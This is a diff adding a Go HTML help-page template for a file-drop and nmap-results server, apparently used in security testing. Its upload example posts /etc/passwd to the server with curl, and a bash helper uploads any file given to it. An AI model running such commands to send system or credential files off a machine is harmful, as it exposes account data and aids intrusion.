@@ -1,0 +1,53 @@
+{{define "title"}}DOC{{end}}
+
+{{define "main"}}
+    <div id="markdown-content">
+        <h1></h1>
+        <pre>
+<b>upload bin :</b>
+curl --data-binary @/etc/passwd {{.Data}}/up/filename
+
+<b>download bin :</b>
+curl -v {{.Data}}/dl/filename
+
+<b>bash :</b>
+
+up() {
+    curl -L --data-binary @${1} {{.Data}}/up/$(echo ${1}|tr / _)
+}
+
+<b>webdav</b>
+
+dav://{{.Data}}/dav/pages
+dav://{{.Data}}/dav/files
+
+<b>create new page :</b>
+<a href="http://{{.Data}}/edit/newpage">newpage</a> http://{{.Data}}/edit/newpage
+
+<b>view raw attachment </b>
+
+{{.Data}}/dl/rawattachment
+
+<b>nmap</b>
+upload results
+curl -N -d @scan.xml  http://{{.Data}}/nmap/up
+
+upload results with forced update
+curl -N -d @scan.xml  http://{{.Data}}/nmap/up?forced=1
+
+get open ports for 1.2.3.4
+http://{{.Data}}/nmap/show/1.2.3.4
+
+get summary for 1.2.3.4
+http://{{.Data}}/nmap/show/1.2.3.4/sum
+
+get all info as json for 1.2.3.4
+http://{{.Data}}/nmap/show/1.2.3.4/all
+
+get ips for port 22 
+http://{{.Data}}/nmap/ports/22
+
+        </pre>
+
+    </div>
+{{end}}
